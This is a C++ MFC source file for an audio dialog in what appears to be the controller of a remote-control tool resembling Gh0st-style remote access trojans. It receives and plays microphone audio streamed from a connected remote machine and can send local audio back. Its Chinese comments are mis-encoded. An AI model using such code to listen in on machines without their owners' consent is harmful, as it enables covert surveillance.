// AudioDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Remote.h"
#include "AudioDlg.h"
#include "afxdialogex.h"
#include "IOCPServer.h"
#include "Common.h"


// CAudioDlg �Ի���

IMPLEMENT_DYNAMIC(CAudioDlg, CDialog)

CAudioDlg::CAudioDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CAudioDlg::IDD, pParent)
	, m_bIsSendLocalAudio(FALSE)
{
	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_AUDIO));  //����ͼ��
	m_iocpServer	= pIOCPServer;       //Ϊ��ĳ�Ա������ֵ
	m_pContext		= pContext;
	m_bIsWorking	= true;

	m_nTotalRecvBytes = 0;

	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));        //�õ����ض�ip
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);

	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
}

CAudioDlg::~CAudioDlg()
{
}

void CAudioDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Check(pDX, IDC_SEND_LOCALAUDIO, m_bIsSendLocalAudio);
}


BEGIN_MESSAGE_MAP(CAudioDlg, CDialog)
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_SEND_LOCALAUDIO, &CAudioDlg::OnBnClickedSendLocalaudio)
END_MESSAGE_MAP()


// CAudioDlg ��Ϣ�������


BOOL CAudioDlg::OnInitDialog()
{
	CDialog::OnInitDialog();


	CString str;
	str.Format("\\\\%s - ��������", m_IPAddress);
	SetWindowText(str);

	// ֪ͨԶ�̿��ƶ˶Ի����Ѿ���
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));

	m_hWorkThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL);

	return TRUE; 
}



DWORD  CAudioDlg::WorkThread(LPVOID lparam)
{
	CAudioDlg	*pThis = (CAudioDlg *)lparam;

	while (pThis->m_bIsWorking)
	{
		if (!pThis->m_bIsSendLocalAudio)
		{
			Sleep(1000);
			continue;
		}
		DWORD	dwBytes = 0;
		LPBYTE	lpBuffer = pThis->m_Audio.GetRecordBuffer(&dwBytes);


	
		if (lpBuffer != NULL && dwBytes > 0)
			pThis->m_iocpServer->Send(pThis->m_pContext, lpBuffer, dwBytes);
	}
	return 0;
}



void CAudioDlg::OnReceiveComplete(void)
{
	m_nTotalRecvBytes += m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	CString	str;
	str.Format("Receive %d KBytes", m_nTotalRecvBytes / 1024);
	SetDlgItemText(IDC_TIP, str);
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_AUDIO_DATA:
		{
			m_Audio.PlayBuffer(m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);   //���Ų�������
			break;
		}
	
	default:
		// ���䷢���쳣����
		return;
	}	
}


void CAudioDlg::OnClose()
{
	m_pContext->m_Dialog[0] = 0;

	closesocket(m_pContext->m_Socket);

	m_bIsWorking = false;
	WaitForSingleObject(m_hWorkThread, INFINITE);

	CDialog::OnClose();
}


void CAudioDlg::OnBnClickedSendLocalaudio()
{
	UpdateData(true);
}
